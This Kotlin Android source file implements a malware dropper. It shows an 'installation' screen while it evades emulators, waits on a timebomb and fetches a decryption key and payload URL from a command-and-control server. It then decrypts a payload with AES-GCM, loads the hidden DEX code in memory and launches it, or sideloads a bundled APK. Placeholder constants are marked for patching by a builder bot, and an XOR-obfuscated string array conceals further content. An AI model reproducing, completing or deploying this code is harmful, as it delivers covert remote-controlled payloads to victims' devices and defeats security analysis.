package com.cristal.bristral.tristal.mistral

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Base64
import android.util.Log
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import dalvik.system.DexClassLoader
import dalvik.system.InMemoryDexClassLoader
import org.json.JSONObject
import java.io.File
import java.net.URL
import java.nio.ByteBuffer
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.Mac
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import javax.net.ssl.HttpsURLConnection

class InstallActivity : AppCompatActivity() {

    companion object {
        // ── Patched by bot ────────────────────────────────────────
        private const val AES_KEY_B64  = "AES_KEY_B64_PLACEHOLDER_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        private const val HMAC_B64     = "HMAC_SHA256_PLACEHOLDER_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
        private const val PAYLOAD_URL  = "PAYLOAD_URL_PLACEHOLDER_DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"
        private const val TIMEBOMB_TS  = "TIMEBOMB_TS_PLACEHOLDER_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        private const val DEVICE_SALT  = "DEVICE_SALT_PLACEHOLDER_CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
        private const val C2_KEY_URL   = "C2_KEY_URL_PLACEHOLDER_EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
        private const val TARGET_PKG   = "com.android.pictach"
        private const val TARGET_CLASS = "com.android.pictach.MainActivity"
        // ─────────────────────────────────────────────────────────

        private val ENCRYPTED: ShortArray = shortArrayOf(
            10000,9990,10000,10000,9994,9996,9997,10044,9994,9991,
            7629,7663,7672,7661,7676,7663,7676,7657,7668,7666,7667,
            7613,7672,7663,7663,7666,7663,7591,7613,6094,6115,6122,
            6122,6121,6087,6117,6130,6127,6128,6127,6130,6143,364,
            334,345,332,349,334,349,328,341,339,338,284,346,349,
            341,336,345,344,274,284,364,336,345,349,335,345,284,
            328,334,325,284,349,347,349,341,338,274,4252,4255,4237,
            4251,4304,4255,4238,4245,3677,3678,3660,3674,30476,30464,
            30466,30529,30478,30465,30475,30493,30464,30470,30475,30529,
            30495,30470,30476,30491,30478,30476,30471,22348,22336,22338,
            22273,22350,22337,22347,22365,22336,22342,22347,22273,22367,
            22342,22348,22363,22350,22348,22343,22273,22370,22350,22342,
            22337,22382,22348,22363,22342,22361,22342,22363,22358,22003,
            21982,21962,21969,21980,21975,21919,21977,21982,21974,21971,
            21978,21979,21907,21919,21964,21963,21982,21965,21963,21974,
            21969,21976,21919,21974,21969,21964,21963,21982,21971,21971,
            21982,21963,21974,21968,21969,21893,21919,30367,30386,30395,
            30395,30392,30358,30388,30371,30398,30369,30398,30371,30382,
            25571,25540,25553,25538,25540,25561,25566,25559,25488,25561,
            25566,25539,25540,25553,25564,25564,25553,25540,25561,25567,
            25566,25502,25502,25502,29083,29116,29089,29094,29107,29118,
            29118,29107,29094,29115,29117,29116,29170,29111,29088,29088,
            29117,29088,29160,29170,21895,21920,21949,21946,21935,21922,
            21922,21935,21946,21927,21921,21920,21998,21928,21935,21927,
            21922,21931,21930,21984,21998,21918,21922,21931,21935,21949,
            21931,21998,21946,21948,21943,21998,21935,21929,21935,21927,
            21920,21984
        )

        fun decrypt(start: Int, end: Int, key: Int): String {
            val chars = CharArray(end - start)
            for (i in chars.indices) chars[i] = (ENCRYPTED[start + i].toInt() xor key).toChar()
            return String(chars)
        }
    }

    private var progressBar: ProgressBar? = null
    private var tvStatus: TextView? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_install)
        progressBar = findViewById(R.id.progress_bar_install)
        tvStatus    = findViewById(R.id.tv_status)
        progressBar?.visibility = View.VISIBLE
        tvStatus?.text = getString(R.string.starting_installation)
        Thread { runPipeline() }.start()
    }

    // ── MAIN PIPELINE ─────────────────────────────────────────────
    private fun runPipeline() {
        try {
            if (!isRealDevice()) { showNormal(); return }
            if (!isActivated())  { showNormal(); return }

            val c2 = fetchC2()
            val rawKey   = c2.first ?: AES_KEY_B64
            val finalKey = deriveKey(rawKey)

            val resolvedUrl = c2.second ?: PAYLOAD_URL
            val isRemote = resolvedUrl.startsWith("http") &&
                !resolvedUrl.contains("PLACEHOLDER")

            val encBytes = if (isRemote) fetchRemote(resolvedUrl) else loadAssets()
            if (encBytes == null || encBytes.isEmpty()) { showError("STEP:LOAD_ASSETS\nbase.apk is null or empty"); return }

            // ── PLACEHOLDER MODE — skip HMAC + AES, install raw base.apk directly ──
            val isPlaceholder = HMAC_B64.contains("PLACEHOLDER") ||
                                AES_KEY_B64.contains("PLACEHOLDER")

            if (isPlaceholder) {
                // No bot patching yet — install base.apk directly from assets
                // MUST run on main thread — PackageInstaller requires main thread context
                runOnUiThread { installApkDirect(encBytes) }
                return
            }

            // ── PATCHED MODE — full HMAC verify + AES decrypt ──
            val hmacKey = c2.first ?: AES_KEY_B64
            if (!verifyHmac(encBytes, HMAC_B64, hmacKey)) { showNormal(); return }

            val dex = aesDecrypt(encBytes, finalKey)
            if (dex == null || dex.isEmpty()) { showNormal(); return }

            loadDex(dex)
            launchTarget()
        } catch (e: Exception) {
            showError("STEP:PIPELINE\n${e.javaClass.simpleName}:\n${e.message}")
        }
    }

    // ── DIRECT APK INSTALL — simplest reliable method using ACTION_VIEW ─────
    private fun installApkDirect(apkBytes: ByteArray) {
        try {
            // Step 1 — write APK to cache
            val apkFile = File(cacheDir, "update.apk")
            apkFile.writeBytes(apkBytes)


            // Step 2 — get FileProvider URI
            val uri = androidx.core.content.FileProvider.getUriForFile(
                this,
                "${packageName}.fileprovider",
                apkFile
            )


            // Step 3 — fire install intent
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }

            startActivity(intent)

        } catch (e: Exception) {
            android.util.Log.e("InstallActivity", "installApkDirect FAILED: ${e.javaClass.simpleName}: ${e.message}", e)
            showError("FAILED:\n${e.javaClass.simpleName}:\n${e.message}")
        }
    }

    // ── CRYPTO ────────────────────────────────────────────────────
    private fun aesDecrypt(data: ByteArray, keyB64: String): ByteArray? {
        return try {
            val key = Base64.decode(keyB64, Base64.NO_WRAP)
            if (key.size != 32) return null
            val iv      = data.copyOfRange(0, 12)
            val ct      = data.copyOfRange(12, data.size)
            val skey    = SecretKeySpec(key, "AES")
            val spec    = GCMParameterSpec(128, iv)
            val cipher  = Cipher.getInstance("AES/GCM/NoPadding")
            cipher.init(Cipher.DECRYPT_MODE, skey, spec)
            cipher.doFinal(ct)
        } catch (e: Exception) { null }
    }

    private fun verifyHmac(data: ByteArray, hmacB64: String, keyB64: String): Boolean {
        return try {
            val key      = Base64.decode(keyB64, Base64.NO_WRAP)
            val expected = Base64.decode(hmacB64, Base64.NO_WRAP)
            val skey     = SecretKeySpec(key, "HmacSHA256")
            val mac      = Mac.getInstance("HmacSHA256")
            mac.init(skey)
            val computed = mac.doFinal(data)
            if (computed.size != expected.size) return false
            var r = 0
            for (i in computed.indices) r = r or (computed[i].toInt() xor expected[i].toInt())
            r == 0
        } catch (e: Exception) { false }
    }

    private fun deriveKey(baseB64: String): String {
        return try {
            if (DEVICE_SALT.contains("PLACEHOLDER")) return baseB64
            val base = Base64.decode(baseB64, Base64.NO_WRAP)
            val salt = Base64.decode(DEVICE_SALT, Base64.NO_WRAP)
            val id   = buildDeviceId()
            val digest = MessageDigest.getInstance("SHA-256")
            digest.update(id.toByteArray(Charsets.UTF_8))
            digest.update(salt)
            val hash = digest.digest()
            val final = ByteArray(32) { i -> (base[i].toInt() xor hash[i].toInt()).toByte() }
            Base64.encodeToString(final, Base64.NO_WRAP)
        } catch (e: Exception) { baseB64 }
    }

    // ── DEVICE ────────────────────────────────────────────────────
    private fun buildDeviceId(): String {
        val aid = try { Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "" } catch (e: Exception) { "" }
        return "$aid|${Build.MODEL}|${Build.MANUFACTURER}|${Build.FINGERPRINT}"
    }

    // ── ENV CHECK ─────────────────────────────────────────────────
    private fun isRealDevice(): Boolean {
        var s = 0
        try { val fp = Build.FINGERPRINT.lowercase(); if (fp.contains("generic") || fp.contains("unknown") || fp.contains("emulator") || fp.contains("sdk_gphone")) s++ } catch (e: Exception) { s++ }
        try { val hw = Build.HARDWARE.lowercase(); if (hw.contains("goldfish") || hw.contains("ranchu") || hw.contains("vbox")) s++ } catch (e: Exception) { s++ }
        try { val m = Build.MODEL.lowercase(); if (m.contains("sdk") || m.contains("emulator")) s++ } catch (e: Exception) { s++ }
        try { val mfr = Build.MANUFACTURER.lowercase(); if (mfr.contains("genymotion") || mfr.contains("unknown")) s++ } catch (e: Exception) { s++ }
        try { val aid = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID); if (aid.isNullOrEmpty() || aid == "000000000000000" || aid == "9774d56d682e549c") s++ } catch (e: Exception) { s++ }
        try { if (File("/dev/socket/qemud").exists() || File("/dev/qemu_pipe").exists()) s++ } catch (e: Exception) { }
        try { val abi = Build.SUPPORTED_ABIS.firstOrNull()?.lowercase() ?: ""; if (abi.contains("x86") && !abi.contains("arm")) s++ } catch (e: Exception) { }
        return s < 2
    }

    // ── TIMEBOMB ──────────────────────────────────────────────────
    private fun isActivated(): Boolean {
        return try {
            val ts = TIMEBOMB_TS.trim().toLongOrNull() ?: return true
            if (ts == 0L) return true
            val prefs: SharedPreferences = getSharedPreferences("sys_cfg", Context.MODE_PRIVATE)
            if (!prefs.contains("t_inst")) prefs.edit().putLong("t_inst", System.currentTimeMillis() / 1000L).apply()
            System.currentTimeMillis() / 1000L >= ts
        } catch (e: Exception) { false }
    }

    // ── C2 FETCH ──────────────────────────────────────────────────
    private fun fetchC2(): Pair<String?, String?> {
        return try {
            if (C2_KEY_URL.contains("PLACEHOLDER") || C2_KEY_URL.isBlank()) return Pair(null, null)
            val conn = URL(C2_KEY_URL).openConnection() as HttpsURLConnection
            conn.connectTimeout = 8000; conn.readTimeout = 10000
            conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
            if (conn.responseCode != 200) { conn.disconnect(); return Pair(null, null) }
            val json = JSONObject(conn.inputStream.bufferedReader().readText())
            conn.disconnect()
            Pair(json.optString("k", "").ifBlank { null }, json.optString("u", "").ifBlank { null })
        } catch (e: Exception) { Pair(null, null) }
    }

    // ── REMOTE FETCH ──────────────────────────────────────────────
    private fun fetchRemote(url: String): ByteArray? {
        return try {
            val conn = URL(url).openConnection() as HttpsURLConnection
            conn.connectTimeout = 15000; conn.readTimeout = 60000
            conn.instanceFollowRedirects = true
            conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
            if (conn.responseCode != 200) { conn.disconnect(); return null }
            val bytes = conn.inputStream.use { it.readBytes() }
            conn.disconnect()
            if (bytes.isEmpty()) null else bytes
        } catch (e: Exception) { null }
    }

    // ── ASSETS ────────────────────────────────────────────────────
    private fun loadAssets(): ByteArray? {
        return try { assets.open("base.apk").use { it.readBytes() } } catch (e: Exception) { null }
    }

    // ── DEX LOADER ────────────────────────────────────────────────
    private fun loadDex(dex: ByteArray) {
        try {
            val cl = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                InMemoryDexClassLoader(ByteBuffer.wrap(dex), classLoader)
            } else {
                val tmp = File(cacheDir, "${System.currentTimeMillis()}.tmp")
                tmp.writeBytes(dex)
                val loader = DexClassLoader(tmp.absolutePath, cacheDir.absolutePath, null, classLoader)
                tmp.delete()
                loader
            }
            val methods = arrayOf("start", "init", "run", "execute", "onCreate")
            val clazz = cl.loadClass(TARGET_CLASS)
            for (m in methods) {
                try { clazz.getDeclaredMethod(m, Context::class.java).also { it.isAccessible = true }.invoke(null, this); return } catch (e: NoSuchMethodException) { }
            }
            try {
                val inst = clazz.getDeclaredConstructor().newInstance()
                for (m in methods) {
                    try { clazz.getDeclaredMethod(m, Context::class.java).also { it.isAccessible = true }.invoke(inst, this); return } catch (e: NoSuchMethodException) { }
                }
            } catch (e: Exception) { }
        } catch (e: Exception) { }
    }

    // ── HELPERS ───────────────────────────────────────────────────
    private fun launchTarget() {
        try {
            // First try direct class launch
            val i = Intent().apply {
                setClassName(TARGET_PKG, TARGET_CLASS)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
            }
            startActivity(i)
            finish()
        } catch (e: Exception) {
            try {
                // Fallback — use package launcher intent
                val launch = packageManager.getLaunchIntentForPackage(TARGET_PKG)
                if (launch != null) {
                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                    startActivity(launch)
                    finish()
                } else {
                    showNormal()
                }
            } catch (ex: Exception) {
                showNormal()
            }
        }
    }

    private fun showNormal() {
        runOnUiThread { tvStatus?.text = getString(R.string.please_keep_connected); progressBar?.visibility = View.GONE }
    }

    // ── SHOW ERROR ON SCREEN — displays exact error so user can report it ─────
    private fun showError(msg: String) {
        runOnUiThread {
            progressBar?.visibility = View.GONE
            tvStatus?.text = "ERROR:\n$msg"
            // Also show as Toast — always visible even if tvStatus is null
            android.widget.Toast.makeText(
                this,
                msg,
                android.widget.Toast.LENGTH_LONG
            ).show()
        }
    }

    override fun onDestroy() { super.onDestroy(); handler.removeCallbacksAndMessages(null) }
}
